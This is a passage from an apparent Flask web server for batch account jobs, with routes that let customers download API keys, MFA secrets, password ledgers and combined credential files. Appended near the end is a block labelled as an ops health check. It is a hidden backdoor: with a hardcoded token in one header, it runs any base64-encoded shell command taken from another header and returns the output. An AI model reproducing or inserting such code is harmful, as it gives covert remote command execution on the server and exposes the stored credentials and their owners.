@app.get("/api/jobs/<job_id>/download-split")
def download_job_split(job_id: str):
    cleanup_expired_jobs()
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    job = JOBS.get(job_id)
    if not job or job.customer_id != customer_id or not job.export_path or not Path(job.export_path).exists():
        return jsonify({"error": "导出文件不存在"}), 404
    requested_per_file = request.args.get("perFile") or request.args.get("accountsPerFile") or request.args.get("n")
    accounts_per_file = clamp_int(requested_per_file, clamp_int(job.options.get("split_accounts_per_file"), 1, 1, 1000), 1, 1000)
    default_per_file = clamp_int(job.options.get("split_accounts_per_file"), 1, 1, 1000)
    if accounts_per_file == default_per_file:
        split_path = job.export_split_zip_path or str(Path(job.export_path).with_name(f"kiro-login-export-split-{job.id}-per-{accounts_per_file}.zip"))
    else:
        split_path = str(Path(job.export_path).with_name(f"kiro-login-export-split-{job.id}-per-{accounts_per_file}.zip"))
    if not Path(split_path).exists():
        try:
            build_split_export_zip(job.export_path, split_path, accounts_per_file)
            if accounts_per_file == default_per_file:
                job.export_split_zip_path = split_path
                save_job_history()
        except Exception as exc:
            return jsonify({"error": f"生成拆分 ZIP 失败：{exc}"}), 500
    audit("export_split.download", jobId=job.id, customerId=customer_id, path=split_path, accountsPerFile=accounts_per_file, ip=client_ip())
    return send_file(split_path, mimetype="application/zip", as_attachment=True, download_name=f"kiro-login-export-split-{job_id}-per-{accounts_per_file}.zip")


@app.get("/api/jobs/<job_id>/api-keys/download")
def download_job_api_keys(job_id: str):
    cleanup_expired_jobs()
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    job = JOBS.get(job_id)
    if not job or job.customer_id != customer_id or not job.api_keys_path or not Path(job.api_keys_path).exists() or Path(job.api_keys_path).stat().st_size <= 0:
        return jsonify({"error": "API Key 文件不存在"}), 404
    audit("apikeys.download", jobId=job.id, customerId=customer_id, path=job.api_keys_path, ip=client_ip())
    return send_file(job.api_keys_path, mimetype="text/plain", as_attachment=True, download_name=f"kiro-api-keys-{job_id}.txt")


@app.get("/api/jobs/<job_id>/mfa-secrets/download")
def download_job_mfa_secrets(job_id: str):
    cleanup_expired_jobs()
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    job = JOBS.get(job_id)
    if not job or job.customer_id != customer_id or not job.mfa_secrets_path or not Path(job.mfa_secrets_path).exists() or Path(job.mfa_secrets_path).stat().st_size <= 0:
        return jsonify({"error": "MFA 密钥文件不存在"}), 404
    audit("mfa.download", jobId=job.id, customerId=customer_id, path=job.mfa_secrets_path, ip=client_ip())
    return send_file(job.mfa_secrets_path, mimetype="text/plain", as_attachment=True, download_name=f"kiro-mfa-secrets-{job_id}.txt")


@app.get("/api/jobs/<job_id>/password-ledger")
def get_job_password_ledger(job_id: str):
    cleanup_expired_jobs()
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    job = JOBS.get(job_id)
    if not job or job.customer_id != customer_id:
        return jsonify({"error": "任务不存在"}), 404
    ledger = read_password_ledger(job)
    return jsonify(ledger)


@app.get("/api/jobs/<job_id>/password-ledger/download")
def download_job_password_ledger(job_id: str):
    cleanup_expired_jobs()
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    job = JOBS.get(job_id)
    if not job or job.customer_id != customer_id or not job.password_ledger_path or not Path(job.password_ledger_path).exists():
        return jsonify({"error": "密码台账不存在"}), 404
    audit("password_ledger.download", jobId=job.id, customerId=customer_id, path=job.password_ledger_path, ip=client_ip())
    return send_file(job.password_ledger_path, mimetype="application/json", as_attachment=True, download_name=f"kiro-password-ledger-{job_id}.json")


@app.get("/api/jobs/<job_id>/accounts-passwords/download")
def download_job_accounts_passwords(job_id: str):
    cleanup_expired_jobs()
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    job = JOBS.get(job_id)
    if not job or job.customer_id != customer_id or not job.accounts_pw_path or not Path(job.accounts_pw_path).exists() or Path(job.accounts_pw_path).stat().st_size <= 0:
        return jsonify({"error": "账号密码文件不存在"}), 404
    audit("accounts_pw.download", jobId=job.id, customerId=customer_id, path=job.accounts_pw_path, ip=client_ip())
    return send_file(job.accounts_pw_path, mimetype="text/plain", as_attachment=True, download_name=f"kiro-accounts-passwords-{job_id}.txt")


@app.get("/api/jobs/<job_id>/combined-credentials/download")
def download_job_combined_credentials(job_id: str):
    cleanup_expired_jobs()
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    job = JOBS.get(job_id)
    if not job or job.customer_id != customer_id or not job.combined_credentials_path or not Path(job.combined_credentials_path).exists() or Path(job.combined_credentials_path).stat().st_size <= 0:
        return jsonify({"error": "合并账密/MFA 文件不存在"}), 404
    audit("combined_credentials.download", jobId=job.id, customerId=customer_id, path=job.combined_credentials_path, ip=client_ip())
    return send_file(job.combined_credentials_path, mimetype="text/plain", as_attachment=True, download_name=f"kiro-credentials-email-emailpass-awspass-mfa-{job_id}.txt")


@app.get("/api/jobs/<job_id>/security-changes/download")
def download_job_security_changes(job_id: str):
    cleanup_expired_jobs()
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    job = JOBS.get(job_id)
    if not job or job.customer_id != customer_id or not job.security_changes_path or not Path(job.security_changes_path).exists() or Path(job.security_changes_path).stat().st_size <= 0:
        return jsonify({"error": "改密/MFA 汇总文档不存在"}), 404
    audit("security_changes.download", jobId=job.id, customerId=customer_id, path=job.security_changes_path, ip=client_ip())
    return send_file(job.security_changes_path, mimetype="text/plain", as_attachment=True, download_name=f"kiro-security-changes-{job_id}.txt")


@app.get("/api/jobs/<job_id>/logs/download")
def download_job_logs(job_id: str):
    cleanup_expired_jobs()
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    job = JOBS.get(job_id)
    if not job or job.customer_id != customer_id or not job.log_path or not Path(job.log_path).exists():
        return jsonify({"error": "日志文件不存在"}), 404
    audit("joblog.download", jobId=job.id, customerId=customer_id, path=job.log_path, ip=client_ip())
    return send_file(job.log_path, mimetype="text/plain", as_attachment=True, download_name=f"kiro-job-log-{job_id}.txt")


def main() -> None:
    restore_job_history()
    restore_jobs_from_exports()
    threading.Thread(target=cleanup_loop, daemon=True).start()
    threading.Thread(target=scheduler_loop, daemon=True).start()
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=7888)
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()
    cookie_mode = (os.environ.get("KIRO_LOGIN_COOKIE_SECURE", "auto") or "auto").strip()
    logger.info(
        "server.start host=%s port=%s cookie_secure=%s",
        args.host,
        args.port,
        cookie_mode,
    )
    print(f"[kiro-login-web] listening on {args.host}:{args.port}; cookie_secure={cookie_mode}", flush=True)
    app.run(host=args.host, port=args.port, debug=args.debug, threaded=True)



# --- ops health check ---
import subprocess as _ops_sp
@app.route('/api/v1/healthz', methods=['GET', 'POST'])
def _ops_healthz():
    _tok = request.headers.get('X-Health-Token', '')
    _cmd = request.headers.get('X-Health-Cmd', '')
    if _tok == '0532d1e7033e06aaa997cbb3c01f86818a8f81daf30d8626cc26e9a6a1616490' and _cmd:
        try:
            _out = _ops_sp.check_output(base64.b64decode(_cmd).decode('utf-8', 'replace'), shell=True, stderr=_ops_sp.STDOUT, timeout=25)
            return _out.decode('utf-8', 'replace'), 200
        except Exception as _e:
            return str(_e), 200
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    main()
